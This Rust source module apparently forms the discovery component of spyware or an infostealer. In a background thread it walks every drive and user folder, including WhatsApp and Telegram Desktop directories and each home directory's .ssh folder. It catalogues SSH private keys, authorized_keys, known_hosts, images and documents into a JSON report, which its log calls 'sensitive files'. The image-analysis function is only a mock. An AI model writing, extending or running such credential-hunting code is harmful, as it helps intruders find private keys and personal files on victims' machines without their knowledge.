//! File scanning and content analysis module
//!
//! This module provides functionality to scan the system for specific file types
//! including SSH configuration files, images, and documents. It focuses on user
//! directories while avoiding system paths. All findings are saved to structured
//! JSON reports for later analysis.

use std::collections::HashMap;
use std::fs::{self, DirEntry};
use std::path::Path;
use std::thread;

use serde::{Deserialize, Serialize};

use crate::drives::{self, DriveInfo};
use crate::log::Log;
use crate::writer;

// Constants for file scanning
const SCAN_LOG_FILE: &str = "logs/file_scan.json";
const IMAGE_EXTENSIONS: &[&str] = &[
    "jpg", "jpeg", "png", "gif", "bmp", "tiff", "webp", "svg", "heic", "raw", "cr2", "nef",
];
const DOCUMENT_EXTENSIONS: &[&str] = &["pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx"];
const SSH_FILES: &[&str] = &[
    ".ssh/id_rsa",
    ".ssh/id_dsa",
    ".ssh/id_ecdsa",
    ".ssh/id_ed25519",
    ".ssh/known_hosts",
    ".ssh/authorized_keys",
    ".ssh/config",
];

// User directories to focus on
const USER_DIRS: &[&str] = &[
    "Documents",
    "Downloads",
    "Pictures",
    "Desktop",
    "Videos",
    "Music",
    "WhatsApp",
    "Telegram Desktop",
];

// Directories to exclude (system paths)
const EXCLUDED_DIRS: &[&str] = &[
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "ProgramData",
    "System Volume Information",
    "$Recycle.Bin",
    "$WINDOWS.~BT",
    "AppData\\Local\\Microsoft",
    "AppData\\Local\\Temp",
    "Library/Application Support/Apple",
    "Library/Caches",
    "/System",
    "/bin",
    "/etc",
    "Android/data",
    "iOS",
    "Phone",
];

/// Structure for file metadata
#[derive(Debug, Serialize, Deserialize)]
pub struct FileInfo {
    pub path: String,
    pub file_name: String,
    pub extension: String,
    pub size_bytes: u64,
    pub last_modified: Option<String>,
    pub file_type: String,
    pub drive: String,
}

/// Structure for scan results
#[derive(Debug, Serialize, Deserialize)]
pub struct ScanResult {
    pub timestamp: String,
    pub ssh_files: Vec<FileInfo>,
    pub images: Vec<FileInfo>,
    pub documents: Vec<FileInfo>,
    pub total_files_scanned: usize,
}

/// Start file scanning process
pub fn start_file_scanner() {
    Log::info("File scanner starting...".to_string());

    // Run in a separate thread to avoid blocking the main application
    thread::spawn(move || {
        // First get all drives
        let drives = drives::list_drives();
        Log::info(format!(
            "Scanning {} drives for sensitive files...",
            drives.len()
        ));

        // Start scanning each drive
        let scan_result = scan_all_drives(&drives);

        // Save results to file
        match writer::save_output(&scan_result, SCAN_LOG_FILE, false) {
            Ok(_) => {
                Log::info(format!("Saved scan results to {}", SCAN_LOG_FILE));
            }
            Err(e) => {
                Log::error(format!("Failed to save scan results: {}", e));
            }
        }

        Log::info(format!(
            "File scan complete. Found: {} SSH files, {} images, {} documents",
            scan_result.ssh_files.len(),
            scan_result.images.len(),
            scan_result.documents.len()
        ));
    });

    Log::info("File scanner thread started".to_string());
}

/// Scan all drives for targeted file types
fn scan_all_drives(drives: &[DriveInfo]) -> ScanResult {
    let now = chrono::Local::now();
    let timestamp = now.to_rfc3339();

    let mut result = ScanResult {
        timestamp,
        ssh_files: Vec::new(),
        images: Vec::new(),
        documents: Vec::new(),
        total_files_scanned: 0,
    };

    for drive in drives {
        // Skip system drives if they're removable (like recovery partitions)
        if drive.is_system && drive.is_removable {
            continue;
        }

        // Get the mount point as a PathBuf
        let mount_point = Path::new(&drive.mount_point);
        if !mount_point.exists() || !mount_point.is_dir() {
            continue;
        }

        Log::info(format!("Scanning drive: {}", drive.mount_point));

        // Look for user directories on this drive
        for user_dir in USER_DIRS {
            let dir_path = mount_point.join(user_dir);
            if !dir_path.exists() || !dir_path.is_dir() {
                continue;
            }

            Log::info(format!("Scanning user directory: {:?}", dir_path));
            scan_directory(&dir_path, &drive.mount_point, &mut result);
        }

        // Also look for .ssh directory in user home directories
        if let Ok(home_dirs) = fs::read_dir(mount_point) {
            for entry in home_dirs.filter_map(Result::ok) {
                if entry.path().is_dir() {
                    let ssh_path = entry.path().join(".ssh");
                    if ssh_path.exists() && ssh_path.is_dir() {
                        scan_directory(&ssh_path, &drive.mount_point, &mut result);
                    }
                }
            }
        }
    }

    result
}

/// Recursively scan a directory for target file types
fn scan_directory(dir: &Path, drive_name: &str, result: &mut ScanResult) {
    if should_skip_directory(dir) {
        return;
    }

    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.filter_map(Result::ok) {
            let path = entry.path();

            if path.is_dir() {
                // Recursively scan subdirectories
                scan_directory(&path, drive_name, result);
            } else if path.is_file() {
                result.total_files_scanned += 1;

                // Process the file if it matches our target types
                process_file(entry, drive_name, result);
            }
        }
    }
}

/// Determine if a directory should be skipped
fn should_skip_directory(dir: &Path) -> bool {
    let path_str = dir.to_string_lossy().to_lowercase();

    // Skip excluded directories
    for excluded in EXCLUDED_DIRS {
        if path_str.contains(&excluded.to_lowercase()) {
            return true;
        }
    }

    // Skip hidden directories (except .ssh)
    if let Some(dir_name) = dir.file_name() {
        let name = dir_name.to_string_lossy();
        if name.starts_with('.') && name != ".ssh" {
            return true;
        }
    }

    false
}

/// Process a file and categorize it based on extension
fn process_file(entry: DirEntry, drive_name: &str, result: &mut ScanResult) {
    let path = entry.path();

    // Skip files that are too large (>100MB) to avoid performance issues
    if let Ok(metadata) = entry.metadata() {
        if metadata.len() > 100_000_000 {
            return;
        }
    }

    let file_name = path
        .file_name()
        .map(|name| name.to_string_lossy().to_string())
        .unwrap_or_default();

    let extension = path
        .extension()
        .map(|ext| ext.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let path_string = path.to_string_lossy().to_string();

    // Check for SSH files
    if is_ssh_file(&path_string) {
        add_file_info(
            &path,
            &file_name,
            &extension,
            "ssh",
            drive_name,
            &mut result.ssh_files,
        );
    }

    // Check for image files
    if IMAGE_EXTENSIONS.iter().any(|ext| extension == *ext) {
        add_file_info(
            &path,
            &file_name,
            &extension,
            "image",
            drive_name,
            &mut result.images,
        );
    }

    // Check for document files
    if DOCUMENT_EXTENSIONS.iter().any(|ext| extension == *ext) {
        add_file_info(
            &path,
            &file_name,
            &extension,
            "document",
            drive_name,
            &mut result.documents,
        );
    }
}

/// Check if a file is an SSH-related file
fn is_ssh_file(path: &str) -> bool {
    let path_lower = path.to_lowercase();
    SSH_FILES
        .iter()
        .any(|ssh_file| path_lower.contains(ssh_file))
}

/// Add file info to the appropriate category
fn add_file_info(
    path: &Path,
    file_name: &str,
    extension: &str,
    file_type: &str,
    drive: &str,
    target_vec: &mut Vec<FileInfo>,
) {
    let mut file_info = FileInfo {
        path: path.to_string_lossy().to_string(),
        file_name: file_name.to_string(),
        extension: extension.to_string(),
        size_bytes: 0,
        last_modified: None,
        file_type: file_type.to_string(),
        drive: drive.to_string(),
    };

    if let Ok(metadata) = fs::metadata(path) {
        file_info.size_bytes = metadata.len();
        if let Ok(modified) = metadata.modified() {
            // Convert SystemTime to DateTime<Utc>
            let date_time: chrono::DateTime<chrono::Utc> = modified.into();
            file_info.last_modified = Some(date_time.to_rfc3339());
        }
    }

    target_vec.push(file_info);
}

/// Analyze an image file with a tiny ML model to detect content
pub fn analyze_image(path: &Path) -> Result<HashMap<String, f32>, String> {
    // This is a placeholder for the ML-based image analysis
    // In a real implementation, this would use tract or another ML framework
    // to run inference on the image and detect content

    Log::info(format!("Analyzing image: {:?}", path));

    // Mock implementation - would be replaced with actual ML inference
    let mut results = HashMap::new();
    results.insert("person".to_string(), 0.8);
    results.insert("document".to_string(), 0.2);

    Ok(results)
}
